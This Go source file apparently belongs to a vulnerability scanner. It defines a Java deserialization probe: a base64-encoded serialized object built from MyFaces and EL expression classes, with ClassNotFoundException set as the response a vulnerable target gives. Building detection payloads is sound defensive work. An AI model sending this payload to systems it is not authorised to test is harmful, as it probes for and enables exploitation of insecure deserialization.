package payload

// JavaDeserialization Payload object
type JavaDeserialization struct {
	input       [][]byte
	output      []byte
	description string
}

// NewJavaDeserialization create a new java deserialization payload
func NewJavaDeserialization() JavaDeserialization {
	return JavaDeserialization{
		// nolint:lll
		input: [][]byte{
			[]byte(`rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAQ29yZy5hcGFjaGUubXlmYWNlcy52aWV3LmZhY2VsZXRzLmVsLlZhbHVlRXhwcmVzc2lvbk1ldGhvZEV4cHJlc3Npb27Yeyw4pSZDawwAAHhyABlqYXZheC5lbC5NZXRob2RFeHByZXNzaW9ucUwXC1qP4fACAAB4cgATamF2YXguZWwuRXhwcmVzc2lvbqOFilPyWtI8AgAAeHBzcgAhb3JnLmFwYWNoZS5lbC5WYWx1ZUV4cHJlc3Npb25JbXBsCI0i/oeIrbgMAAB4cgAYamF2YXguZWwuVmFsdWVFeHByZXNzaW9udwqAW+DA/pECAAB4cQB+AAR3GwAHJHt0cnVlfQAQamF2YS5sYW5nLk9iamVjdHBweHhxAH4ABXNxAH4AAnNxAH4ABncWAAJscwAQamF2YS5sYW5nLk9iamVjdHBweHhxAH4ACXg=`),
		},
		output:      []byte(`ClassNotFoundException`),
		description: "Java Deserialization",
	}
}

// Input get the payload input
func (o JavaDeserialization) Input() [][]byte {
	return o.input
}

// Output get the expected output of a vulnerable target
func (o JavaDeserialization) Output() []byte {
	return o.output
}

// Description one-liner description for the vulnerability
func (o JavaDeserialization) Description() string {
	return o.description
}
